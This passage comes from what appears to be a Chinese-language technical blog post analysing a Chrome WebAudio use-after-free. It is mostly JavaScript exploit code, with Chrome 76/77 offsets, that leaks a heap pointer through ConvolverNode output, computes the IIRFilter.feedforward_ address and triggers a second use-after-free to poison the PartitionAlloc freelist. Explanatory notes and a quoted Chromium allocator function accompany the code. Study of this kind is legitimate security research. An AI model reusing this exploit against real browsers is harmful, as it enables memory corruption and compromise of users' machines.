</span></span><span style="display:flex;"><span>    		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">channelDataArray</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">channelDataArray</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	        		<span style="color:#a6e22e">channelDataArray</span>[<span style="color:#a6e22e">j</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">channelDataArray</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            			<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">u64Array</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BigUint64Array</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>            			<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">u32Array</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#a6e22e">u64Array</span>.<span style="color:#a6e22e">buffer</span>);
</span></span><span style="display:flex;"><span>            			<span style="color:#a6e22e">u32Array</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">channelDataArray</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>            			<span style="color:#a6e22e">u32Array</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">channelDataArray</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            			<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">leakedAddr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">byteSwapBigInt</span>(<span style="color:#a6e22e">u64Array</span>[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>            			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">leakedAddr</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">32</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x8000</span>))
</span></span><span style="display:flex;"><span>                			<span style="color:#a6e22e">leakedAddr</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x800000000000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>             			<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">superPageBase</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getSuperPageBase</span>(<span style="color:#a6e22e">leakedAddr</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	             		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">superPageBase</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0xFFFFFFFF</span>) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>		             		<span style="color:#a6e22e">superPageBase</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0xFFFFFFFFFFFF</span>)) {
</span></span><span style="display:flex;"><span>                			<span style="color:#a6e22e">finished</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>                			<span style="color:#a6e22e">evt</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                			<span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">disconnect</span>();
</span></span><span style="display:flex;"><span>                			<span style="color:#a6e22e">scriptNode</span>.<span style="color:#a6e22e">disconnect</span>();
</span></span><span style="display:flex;"><span>                			<span style="color:#a6e22e">convolver</span>.<span style="color:#a6e22e">disconnect</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                			<span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>                     			<span style="color:#a6e22e">doneCb</span>(<span style="color:#a6e22e">leakedAddr</span>);
</span></span><span style="display:flex;"><span>                			}, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                			<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>            			}
</span></span><span style="display:flex;"><span>        		}
</span></span><span style="display:flex;"><span>    		}
</span></span><span style="display:flex;"><span>	};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">startRendering</span>().<span style="color:#a6e22e">then</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">buffer</span>) {
</span></span><span style="display:flex;"><span>    		<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">finished</span>) {
</span></span><span style="display:flex;"><span>        	 	<span style="color:#a6e22e">finished</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>       	  	<span style="color:#a6e22e">triggerUaF</span>(<span style="color:#a6e22e">doneCb</span>);
</span></span><span style="display:flex;"><span>    		}
</span></span><span style="display:flex;"><span>	});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">finished</span>) {
</span></span><span style="display:flex;"><span>    		<span style="color:#a6e22e">convolver</span>.<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    		<span style="color:#a6e22e">convolver</span>.<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">channelBuffer</span>;
</span></span><span style="display:flex;"><span>    		<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">later</span>(<span style="color:#ae81ff">100</span>); <span style="color:#75715e">// wait 100 millseconds
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">later</span>(<span style="color:#a6e22e">delay</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">delay</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">byteSwapBigInt</span>(<span style="color:#a6e22e">x</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0xFF</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>思路如下：</p>
<ul>
<li>创建一段全 0 的音频数据 channelBuffer</li>
<li>创建节点：
<ul>
<li>音源节点 bufferSource，以 channelBuffer 为输入</li>
<li>混响处理节点 convolerNode，IR 参数为 channelBuffer</li>
<li>脚本处理节点 scriptNode，利用其 onaudioprocess 事件处理函数，检查混响输出的数据</li>
</ul>
</li>
<li>连接上面的所有节点，构造 bufferSouce -&gt; convolerNode -&gt; scriptNode -&gt; destination 处理图，其中 destination 是 <code>OfflineAudioContext</code> 内部的特殊节点，代表数据处理的结果</li>
<li>调用 <code>startRendering()</code> 函数，启动音频处理任务，这个函数返回的是 <code>Promise</code> 对象，调用其 <code>then</code> 设置一个回调函数，在任务完成后检查漏洞是否利用成功，如果没成功则递归调用 trigerUaF 继续触发漏洞</li>
<li><code>startRendering</code> 只是发送一个任务到音频处理线程，不会等待任务的处理，在其返回后主线程继续执行后续代码，执行到 while 循环，不断的在 <code>null</code> 和 <code>channelBuffer</code> 之间赋值混淆节点的 <code>buffer</code>。</li>
</ul>
<p>对全 0 数据做混响，得到的结果应该还是全 0，如果混响的结果中包含了非 0 数据，就说明漏洞被成功触发了，混响过程中读到了下一个空闲块的指针。scriptNode 的事件处理就是在检查混响输出的数据，在其中查找这个指针，这个指针是大小端翻转过的，在读取到以后要用 <code>byteSwapBigInt</code> 把它复原。</p>
<hr>
<p><strong>ℹ️NOTE</strong>: PartitionAlloc 为了缓解漏洞利用，把空闲链表的指针大小端翻转存储。</p>
<hr>
<h4 id="计算-iirfilterfeedforward_-地址">计算 IIRFilter.feedforward_ 地址</h4>
<p><a href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/platform/audio/iir_filter.h"><code>IIRFilter</code></a> 内部也有一个 <code>AudioArray</code> 成员 <code>IIRFilter::feedforward_</code>。用上一步泄露出的地址，加上固定的偏移，就可以计算出 <code>IIRFilter.feedforward_</code> 的地址。</p>
<hr>
<p><strong>ℹ️NOTE</strong>: 水平所限我不能确定这个固定偏移的来源，我推测是每次 <code>JavaScript</code> 代码运行过程中分配的对象大致相同，整体占用内存也不多，就使得两块内存一般在同一个 SuperPage 中且间隔页面大致固定。</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">initialUAFCallback</span>(<span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">partitionPageIndexDelta</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sharedAudioCtx</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">OfflineAudioContext</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">majorVersion</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">77</span><span style="color:#f92672">:</span> <span style="color:#75715e">// 77.0.3865.75
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">partitionPageIndexDelta</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">26</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">76</span><span style="color:#f92672">:</span> <span style="color:#75715e">// 76.0.3809.87
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">partitionPageIndexDelta</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">25</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">iirFilterFeedforwardAllocationPtr</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">getPartitionPageBaseWithinSuperPage</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">getPartitionPageIndex</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">partitionPageIndexDelta</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x1FF0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">triggerSecondUAF</span>(
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">byteSwapBigInt</span>(<span style="color:#a6e22e">iirFilterFeedforwardAllocationPtr</span>),
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">finalUAFCallback</span>
</span></span><span style="display:flex;"><span>	 );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="释放-iirfilterfeedforward_">释放 IIRFilter.feedforward_</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">triggerSecondUAF</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">doneCb</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">counter</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">numChannels</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">audioCtx</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">OfflineAudioContext</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x100000</span>, <span style="color:#ae81ff">48000</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">bufferSource</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createBufferSource</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">convolver</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createConvolver</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">bigAudioBuffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createBuffer</span>(<span style="color:#a6e22e">numChannels</span>, <span style="color:#ae81ff">0x100</span>, <span style="color:#ae81ff">48000</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">smallAudioBuffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createBuffer</span>(<span style="color:#a6e22e">numChannels</span>, <span style="color:#ae81ff">0x2</span>, <span style="color:#ae81ff">48000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">smallAudioBuffer</span>.<span style="color:#a6e22e">getChannelData</span>(<span style="color:#ae81ff">0</span>).<span style="color:#a6e22e">fill</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">numChannels</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">channelDataArray</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BigUint64Array</span>(<span style="color:#a6e22e">bigAudioBuffer</span>.<span style="color:#a6e22e">getChannelData</span>(<span style="color:#a6e22e">i</span>).<span style="color:#a6e22e">buffer</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">channelDataArray</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addr</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bigAudioBuffer</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">convolver</span>.<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">smallAudioBuffer</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">loop</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">loopStart</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">loopEnd</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">convolver</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">convolver</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">destination</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">start</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">finished</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">startRendering</span>().<span style="color:#a6e22e">then</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">buffer</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">finished</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">audioCtx</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">doneCb</span>, <span style="color:#ae81ff">200</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">finished</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">triggerSecondUAF</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">doneCb</span>);
</span></span><span style="display:flex;"><span>      }, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">finished</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">counter</span><span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">convolver</span>.<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">later</span>(<span style="color:#ae81ff">1</span>); <span style="color:#75715e">// wait 1 millisecond
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">finished</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">iirFilters</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">floatArray</span>.<span style="color:#a6e22e">fill</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">iirFilters</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">getFrequencyResponse</span>(<span style="color:#a6e22e">floatArray</span>, <span style="color:#a6e22e">floatArray</span>, <span style="color:#a6e22e">floatArray</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">floatArray</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3.1415927410125732</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">finished</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>       <span style="color:#75715e">// &lt;&lt; 申请被释放掉的 IIRFilter.feedforward_
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">audioBufferArray2</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createBuffer</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10000</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">audioBufferArray2</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createBuffer</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10000</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">disconnect</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">convolver</span>.<span style="color:#a6e22e">disconnect</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">later</span>(<span style="color:#ae81ff">1</span>); <span style="color:#75715e">// wait 1 millisecond
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">convolver</span>.<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">smallAudioBuffer</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>用 <code>IIRFilter.Feewordward_</code> 的地址把 <code>AudioBuffer</code> 填满，之后再次触发漏洞，利用 <code>accumulation_buffer_</code>，把 <code>IIRFilter.feedforward_</code> 的地址写入释放后的内存块开头，就相当于把 <code>IIRFilter.feedforward_</code> 指向的缓冲区插入 <code>accumulation_buffer_</code> 所属页面的空闲链表。</p>
<p><code>IIRFilter.feedforward_</code> 和 <code>accumulation_buffer_</code> 两个内存块的大小不同，所属页面也一定不同，<code>IIRFilter.feedforward_</code> 其实是被插入到了错误的链表上，但是这并不影响漏洞利用，后续对 <code>AudioArray::Allocate</code> 函数调用会申请到这块内存，之后这块内存再次被释放时，释放动作就会把它插入到正确的页面中，就修正了之前的错误。</p>
<hr>
<p><strong>ℹ️NOTE</strong>: 我调试来看由于利用代码故意选择了 0xf0 结尾的内存地址，此内存块的地址不满足 <code>AudioBuffer</code> 的 0x20 对齐要求，<code>AudioBuffer</code> 在申请到以后并不会使用这块内存，直接就释放了。</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span>woid AudioArray<span style="color:#f92672">::</span>Allocate(size_t n) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Although n is a size_t, its true limit is max unsigned because we use
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// unsigned in zeroRange() and copyToRange(). Also check for integer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// overflow.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	CHECK_LE(n, std<span style="color:#f92672">::</span>numeric_limits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span><span style="color:#f92672">&gt;::</span>max() <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(T));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> initial_size <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">sizeof</span>(T) <span style="color:#f92672">*</span> n);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#if defined(ARCH_CPU_X86_FAMILY) || defined(WTF_USE_WEBAUDIO_FFMPEG)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> kAlignment <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#else
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> kAlignment <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (allocation_)
</span></span><span style="display:flex;"><span>		WTF<span style="color:#f92672">::</span>Partitions<span style="color:#f92672">::</span>FastFree(allocation_);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> is_allocation_good <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>is_allocation_good) {
